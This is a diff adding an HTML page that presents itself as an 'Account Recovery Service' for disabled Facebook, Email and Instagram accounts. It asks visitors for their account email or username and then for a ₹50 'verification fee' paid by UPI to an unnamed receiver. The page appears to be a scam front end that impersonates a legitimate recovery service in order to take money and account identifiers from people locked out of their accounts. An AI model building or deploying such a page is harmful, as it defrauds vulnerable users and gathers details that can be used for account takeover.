@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Recovery Service</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Welcome Screen -->
+        <section id="screen-welcome" class="screen active">
+            <div class="card">
+                <div class="icon-box">🔒</div>
+                <h1>Welcome to my account</h1>
+                <p>Secure and fast verification & recovery assistant for your digital profiles.</p>
+                <button class="btn primary" onclick="goToScreen('screen-select')">Continue</button>
+            </div>
+        </section>
+
+        <!-- Select Account Type Screen -->
+        <section id="screen-select" class="screen">
+            <div class="card">
+                <h2>Disable Account Recovery</h2>
+                <p class="subtitle">Choose the platform that was disabled:</p>
+                <div class="options-list">
+                    <button class="option-btn" onclick="selectPlatform('Facebook')">
+                        <span class="opt-icon">📘</span>
+                        <div>
+                            <strong>Facebook</strong>
+                            <small>Social Network Profile</small>
+                        </div>
+                    </button>
+                    <button class="option-btn" onclick="selectPlatform('Email')">
+                        <span class="opt-icon">✉️</span>
+                        <div>
+                            <strong>Email</strong>
+                            <small>Mail & Cloud Services</small>
+                        </div>
+                    </button>
+                    <button class="option-btn" onclick="selectPlatform('Instagram')">
+                        <span class="opt-icon">📸</span>
+                        <div>
+                            <strong>Instagram</strong>
+                            <small>Photos & Reels</small>
+                        </div>
+                    </button>
+                </div>
+                <button class="btn secondary" onclick="goToScreen('screen-welcome')">Back</button>
+            </div>
+        </section>
+
+        <!-- Email Input Screen -->
+        <section id="screen-email" class="screen">
+            <div class="card">
+                <h2 id="platform-title">Enter Account Email</h2>
+                <p class="subtitle">Provide your registered email address to proceed.</p>
+                <form id="recovery-form" onsubmit="handleNext(event)">
+                    <div class="input-group">
+                        <label for="email-input">Email ID / Username</label>
+                        <input type="text" id="email-input" placeholder="name@example.com" required>
+                    </div>
+                    <button type="submit" class="btn primary">Next</button>
+                </form>
+                <button class="btn secondary" onclick="goToScreen('screen-select')">Back</button>
+            </div>
+        </section>
+
+        <!-- Payment Screen -->
+        <section id="screen-payment" class="screen">
+            <div class="card text-center">
+                <div class="icon-box">⚡</div>
+                <h2>Complete Verification Fee</h2>
+                <p class="subtitle">Secure processing fee of <strong>₹50</strong> required to initiate recovery.</p>
+                <div class="amount-box">₹50</div>
+                <p class="upi-note">Payment goes directly to verified receiver.</p>
+                <button class="btn primary" onclick="payViaUPI()">Pay ₹50 via UPI (PhonePe)</button>
+                <button class="btn secondary" onclick="goToScreen('screen-email')">Back</button>
+            </div>
+        </section>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
